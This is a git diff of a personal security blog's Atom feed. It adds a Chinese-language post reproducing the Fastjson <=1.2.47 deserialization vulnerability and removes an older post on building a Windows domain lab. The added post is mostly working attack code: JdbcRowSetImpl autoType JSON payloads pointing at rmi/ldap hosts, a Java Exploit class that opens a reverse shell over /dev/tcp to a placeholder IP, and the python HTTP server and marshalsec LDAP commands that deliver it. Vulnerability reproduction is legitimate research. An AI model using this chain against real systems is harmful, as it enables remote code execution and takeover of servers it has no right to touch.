@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-05-28T03:09:09.970Z</updated>
+  <updated>2020-06-22T10:25:28.251Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Fastjson&lt;=1.2.47 反序列化漏洞</title>
+    <link href="http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-反序列化漏洞/</id>
+    <published>2020-06-22T10:01:18.000Z</published>
+    <updated>2020-06-22T10:25:28.251Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>fastjson-1.2.47</li><li>jdk-8u181-linux-x64.tar.gz</li><li>marshalsec-0.0.3-SNAPSHOT-all.jar</li><li>tomcat8.35</li></ul><p>可以用P神的vulhub和docker搭建，这里我尝试搭建了好久报错，就还是自己手工搭建吧。</p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dajian.png" alt><br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/test.png" alt></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://q0qdv.l.dnslog.io/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dnslog.png" alt></p><p>但是好像只能打一次，过一会就不能打了。</p><p>接下来我们反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx.xxx.xxx.xxx/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将以上代码保存为Exploit.java，然后javac编译成class，编译好之后上传服务器，在该目录下启用python http服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7000</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/7000.png" alt></p><p>开启nc监听，上面的代码中监听的12345：<br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/nc.png" alt></p><p>使用marshalsec工具快捷的开启LDAP服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xxx.xxx.xxx.xxx:7000/#Exploit 7500</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/marshalsec.png" alt></p><p>一共开启了三个监听，最后我们发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://xxxxxx:7000/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>shell就可以弹回来了，但是一个ip只可以利用一次。</p><p>还需要注意jdk的版本。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;fastjson-1.2.47&lt;/li&gt;
+&lt;li&gt;jdk-8u181-linux-x64.tar.gz&lt;/li&gt;
+      
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>JAVA反射学习代码</title>
@@ -495,36 +521,6 @@
       <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
       <category term="后渗透" scheme="http://sherlocz.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>简单的域环境搭建</title>
-    <link href="http://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
-    <id>http://sherlocz.github.io/2020/01/31/简单的域环境搭建/</id>
-    <published>2020-01-31T14:16:55.000Z</published>
-    <updated>2020-01-31T15:57:26.800Z</updated>
-    
-    <content type="html"><![CDATA[<p>环境</p><ul><li>Windows server 2012(DC)</li><li>Windows server 2008</li><li>Windows7</li></ul><h1 id="配置DC服务器"><a href="#配置DC服务器" class="headerlink" title="配置DC服务器"></a>配置DC服务器</h1><p>这里用windows server 2012作为域控服务器，首先我们修改网络，这里我们自定义ip，并将DNS设为2012本机(一般域控也作为DNS服务器)<br><img src="/2020/01/31/简单的域环境搭建/network12.png" alt></p><p>然后我们在服务器管理里面，点击 <strong>添加角色和功能</strong><br><img src="/2020/01/31/简单的域环境搭建/121.png" alt></p><p>第一页是导向，我们不管点击下一步。</p><p>安装类型我们就选择默认的就好。<br><img src="/2020/01/31/简单的域环境搭建/122.png" alt></p><p>服务器选择，我们这里占时就一台服务器，我们点击下一步就好<br><img src="/2020/01/31/简单的域环境搭建/123.png" alt></p><p>服务器角色，我们选择安装 <strong>Active Directory域服务</strong> 和 <strong>DNS服务器</strong><br><img src="/2020/01/31/简单的域环境搭建/124.png" alt></p><p>后面的步骤就一路默认就行，最后点击安装。<br><img src="/2020/01/31/简单的域环境搭建/126.png" alt><br><img src="/2020/01/31/简单的域环境搭建/127.png" alt></p><p>这里安装完毕之后，在服务器管理器的页面中点击右上方的小黄旗，然后我们要将这台服务器提升为域控服务器<br><img src="/2020/01/31/简单的域环境搭建/128.png" alt></p><p>点击之后 部署配置这里我们操作为 <strong>添加新林</strong>，然后我们要设置根域名，也就是域名，这里设置成 <strong>hacke.testlab</strong><br><img src="/2020/01/31/简单的域环境搭建/1210.png" alt></p><p>域控制器选项这里填写好密码，后面的操作默认就好。</p><p>上面所有的步骤进行完了之后，重启，然后命令行下输入net view，出现了错误<br><img src="/2020/01/31/简单的域环境搭建/error.png" alt></p><p>解决方式：将Computer Browser服务启动就行<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><p>我们这里再输入命令，当我们看到HACKE这个域的时候，就说明已经配置ok了<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><h1 id="配置域内其他服务器"><a href="#配置域内其他服务器" class="headerlink" title="配置域内其他服务器"></a>配置域内其他服务器</h1><p>这里我用08举例子<br><img src="/2020/01/31/简单的域环境搭建/08.png" alt></p><p>ip设为固定ip，DNS指向我们的域控服务器。</p><p>计算机名我们自行修改，然后下方选择加入的域(这里会要认证域管理权限的账号)</p><p>然后关闭域网络中的防火墙</p><p>所有配置好之后，cmd下运行<br><img src="/2020/01/31/简单的域环境搭建/07.png" alt></p><p>这里就能看见，这个hacke域下所有的机器了</p><p>当你运行命令之后回显成这样，就说明域环境配置成功啦</p><h1 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">#查看局域网内的域控</span><br><span class="line"></span><br><span class="line">net view /domain:domainname</span><br><span class="line">#查看domainname域中的主机</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;环境&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Windows server 2012(DC)&lt;/li&gt;
-&lt;li&gt;Windows server 2008&lt;/li&gt;
-&lt;li&gt;Windows7&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1 id=&quot;配置DC服务器&quot;&gt;&lt;a href=&quot;#配置DC服务器&quot; cla
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
